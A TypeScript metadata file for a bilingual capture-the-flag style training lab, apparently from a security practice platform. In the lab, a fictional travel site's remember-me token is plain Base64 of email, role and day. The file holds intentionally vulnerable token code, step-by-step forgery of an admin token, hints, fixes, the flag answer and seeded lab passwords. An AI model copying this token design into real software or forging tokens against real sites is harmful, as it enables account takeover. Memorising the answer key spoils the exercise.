// src/modules/practice-labs/broken-auth/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const brokenAuthLab2Metadata: LabMetadata = {
  slug: 'broken-auth-remember-me-token-forgery-travel',
  title:
    'Broken Auth: Predictable Remember-Me Token — Travel Booking Account Takeover',
  ar_title:
    'Broken Auth: توكن Remember-Me قابل للتنبؤ — الاستيلاء على حساب حجز السفر',
  description:
    'Exploit a broken authentication vulnerability in a travel booking platform where the persistent "remember me" token is generated using a weak, predictable algorithm. Forge a valid remember-me token for an admin account and gain persistent access.',
  ar_description:
    'استغل ثغرة مصادقة مكسورة في منصة حجز سفر حيث يتم إنشاء توكن remember-me باستخدام خوارزمية ضعيفة وقابلة للتنبؤ. قم بتزوير توكن remember-me صالح لحساب المسؤول واحصل على وصول دائم.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'Broken Authentication',
    'Token Forgery',
    'Predictable Token',
    'Persistent Session Attack',
    'Cryptographic Weakness',
  ],
  xpReward: 240,
  pointsReward: 120,
  duration: 40,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Analyze your own remember-me token to discover the weak generation algorithm (Base64 of email:role:date). Forge a token for admin@flytrek.io with role "admin" and use it to access the admin dashboard.',
  ar_goal:
    'حلل توكن remember-me الخاص بك لاكتشاف خوارزمية التوليد الضعيفة (Base64 لـ email:role:date). قم بتزوير توكن لـ admin@flytrek.io بدور "admin" واستخدمه للوصول إلى لوحة تحكم المسؤول.',

  briefing: {
    en: `FlyTrek — travel booking platform. Flights, hotels, car rentals.
You logged in. You checked "Remember Me."
A cookie appears: rememberMe=bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE=
You're a developer. You look at that string.
Base64.
You decode it.
nour@flytrek.io:user:19741
email:role:dayNumber.
The day number is just Math.floor(Date.now() / 86400000).
Today is 19741.
The algorithm is in front of you.
admin@flytrek.io. Role: admin.
Base64("admin@flytrek.io:admin:19741").
One line of code.
One forged cookie.
Complete admin access.
No password needed.`,
    ar: `FlyTrek — منصة حجز سفر. رحلات، فنادق، تأجير سيارات.
سجّلت الدخول. اخترت "تذكّرني."
يظهر كوكي: rememberMe=bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE=
أنت مطور. تنظر لتلك السلسلة.
Base64.
تفككها.
nour@flytrek.io:user:19741
email:role:dayNumber.
رقم اليوم هو فقط Math.floor(Date.now() / 86400000).
اليوم هو 19741.
الخوارزمية أمامك.
admin@flytrek.io. الدور: admin.
Base64("admin@flytrek.io:admin:19741").
سطر كود واحد.
كوكي مزوَّر واحد.
وصول كامل للمسؤول.
لا حاجة لكلمة مرور.`,
  },

  stepsOverview: {
    en: [
      'Login as traveler_nour → call /auth/get-remember-token → receive Base64 token',
      'Decode the token: Base64 → "nour@flytrek.io:user:<dayNumber>"',
      'Understand the algorithm: Base64(email + ":" + role + ":" + Math.floor(Date.now()/86400000))',
      'Forge admin token: Base64("admin@flytrek.io:admin:<today_day>")',
      'POST /auth/remember-login { "rememberToken": "<forged>" } → logged in as admin',
      'GET /admin/dashboard → flag returned',
    ],
    ar: [
      'سجّل الدخول كـ traveler_nour → استدعِ /auth/get-remember-token → استلم توكن Base64',
      'فكّ ترميز التوكن: Base64 → "nour@flytrek.io:user:<dayNumber>"',
      'افهم الخوارزمية: Base64(email + ":" + role + ":" + Math.floor(Date.now()/86400000))',
      'قم بتزوير توكن المسؤول: Base64("admin@flytrek.io:admin:<today_day>")',
      'POST /auth/remember-login { "rememberToken": "<forged>" } → سجّل الدخول كـ admin',
      'GET /admin/dashboard → يُعاد العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'FlyTrek remember-me token = Base64(email:role:dayNumber). The server decodes the Base64 and directly trusts the email and role from the token WITHOUT database validation. An attacker who understands the encoding can generate a valid admin token for any email address without knowing any password.',
    vulnerableCode:
      '// Remember-me token generation (vulnerable):\n' +
      'function generateRememberToken(email: string, role: string): string {\n' +
      '  const day = Math.floor(Date.now() / 86400000);\n' +
      '  // ❌ Predictable: just Base64 of known values\n' +
      "  return Buffer.from(`${email}:${role}:${day}`).toString('base64');\n" +
      '}\n\n' +
      '// Remember-me validation (vulnerable):\n' +
      "app.get('/auth/remember-login', async (req, res) => {\n" +
      '  const token = req.cookies.rememberMe;\n' +
      '  // ❌ Decodes and trusts without DB lookup!\n' +
      "  const decoded = Buffer.from(token, 'base64').toString();\n" +
      "  const [email, role] = decoded.split(':');\n" +
      '  req.session.user = { email, role };\n' +
      '  res.json({ success: true, user: { email, role } });\n' +
      '});',
    exploitation:
      '1. Decode own token: atob("bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE=") = "nour@flytrek.io:user:19741"\n' +
      '2. Forge: btoa("admin@flytrek.io:admin:19741") = "YWRtaW5AZmx5dHJlay5pbzphZG1pbjoxOTc0MQ=="\n' +
      '3. POST /auth/remember-login { "rememberToken": "YWRtaW5AZmx5dHJlay5pbzphZG1pbjoxOTc0MQ==" }\n' +
      '4. GET /admin/dashboard → flag',
    steps: {
      en: [
        'POST /auth/login { "email": "nour@flytrek.io", "password": "nour123" } → success',
        'GET /auth/get-remember-token → "bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE="',
        'Decode: "nour@flytrek.io:user:19741" — pattern confirmed',
        'Use /auth/forge-token { "email": "admin@flytrek.io", "role": "admin" } → forged token',
        'POST /auth/remember-login { "rememberToken": "<forged>" } → { "user": { "email": "admin@flytrek.io", "role": "admin" } }',
        'GET /admin/dashboard → flag: FLAG{BROKEN_AUTH_PREDICTABLE_REMEMBER_ME_TOKEN_FORGED}',
      ],
      ar: [
        'POST /auth/login { "email": "nour@flytrek.io"، "password": "nour123" } → نجح',
        'GET /auth/get-remember-token → "bm91ckBmbHl0cmVrLmlvOnVzZXI6MTk3NDE="',
        'فك التشفير: "nour@flytrek.io:user:19741" — النمط مؤكَّد',
        'استخدم /auth/forge-token { "email": "admin@flytrek.io"، "role": "admin" } → التوكن المزوَّر',
        'POST /auth/remember-login { "rememberToken": "<forged>" } → { "user": { "email": "admin@flytrek.io"، "role": "admin" } }',
        'GET /admin/dashboard → العلم: FLAG{BROKEN_AUTH_PREDICTABLE_REMEMBER_ME_TOKEN_FORGED}',
      ],
    },
    fix: [
      'Use opaque random tokens: generate crypto.randomBytes(32) → store in DB with userId → look up on use — NEVER encode user identity in the token itself',
      'Server-side validation: ALWAYS look up the token in the database and retrieve user identity from DB — never trust token-embedded claims',
      'Token expiry: remember-me tokens should expire (7-30 days) and be single-use or rotated on each use',
      'HMAC signing: if token must contain data, HMAC-sign it with a server secret — tampering without the key is computationally infeasible',
    ],
  },

  postSolve: {
    explanation: {
      en: 'This is a token design vulnerability. The fatal flaw is encoding user identity (email, role) in the token and then trusting that encoded data without server-side verification. Base64 is encoding, not encryption — it is trivially reversible by anyone. A remember-me token must be an opaque random value that acts as a pointer to server-stored session data. The token itself must contain no semantic information.',
      ar: 'هذه ثغرة تصميم توكن. الخلل القاتل هو ترميز هوية المستخدم (email، role) في التوكن ثم الثقة بتلك البيانات المُرمَّزة بدون التحقق من جانب الخادم. Base64 هو ترميز وليس تشفيراً — يمكن لأي شخص عكسه بشكل تافه. يجب أن يكون توكن remember-me قيمة عشوائية معتمة تعمل كمؤشر لبيانات الجلسة المخزَّنة في الخادم. يجب ألا يحتوي التوكن نفسه على أي معلومات دلالية.',
    },
    impact: {
      en: 'Persistent admin access to a travel booking platform: all customer bookings, payment card data, loyalty points, flight manifests, admin controls. The attack requires zero interaction from the admin — no phishing, no social engineering. Any attacker who knows the admin email address can forge a valid persistent session token.',
      ar: 'وصول دائم للمسؤول إلى منصة حجز سفر: جميع حجوزات العملاء، بيانات بطاقات الدفع، نقاط الولاء، بيانات قوائم الرحلات، عناصر التحكم للمسؤول. لا يتطلب الهجوم أي تفاعل من المسؤول — لا تصيد، لا هندسة اجتماعية. أي مهاجم يعرف عنوان بريد المسؤول الإلكتروني يمكنه تزوير توكن جلسة دائم صالح.',
    },
    fix: [
      'Random opaque tokens: generate using crypto.randomBytes(32) — 256-bit entropy, zero semantic content',
      'Database-backed: store { token_hash, userId, createdAt, expiresAt } — the token is just a key, identity is in the DB',
      'Token rotation: issue a new token on each use — old token becomes invalid immediately',
      'Absolute and sliding expiry: 30-day absolute max, reset on activity — force re-authentication after inactivity',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'Login and call /auth/get-remember-token. Decode the returned token from Base64 (use atob() in browser or Buffer.from(token, "base64").toString() in Node). What do you see inside?',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'The token is Base64(email:role:dayNumber) where dayNumber = Math.floor(Date.now() / 86400000). Can you craft the same formula for admin@flytrek.io with role "admin"?',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'Use /auth/forge-token { "email": "admin@flytrek.io", "role": "admin" } to generate the forged token. Then POST /auth/remember-login { "rememberToken": "<forged_token>" } and access /admin/dashboard.',
    },
  ],

  flagAnswer: 'FLAG{BROKEN_AUTH_PREDICTABLE_REMEMBER_ME_TOKEN_FORGED}',
  initialState: {
    users: [
      {
        username: 'traveler_nour',
        password: 'nour123',
        role: 'user',
        email: 'nour@flytrek.io',
      },
      {
        username: 'admin_flytrek',
        password: 'FLY_ADM1N_S3CR3T!',
        role: 'admin',
        email: 'admin@flytrek.io',
      },
    ],
  },
};
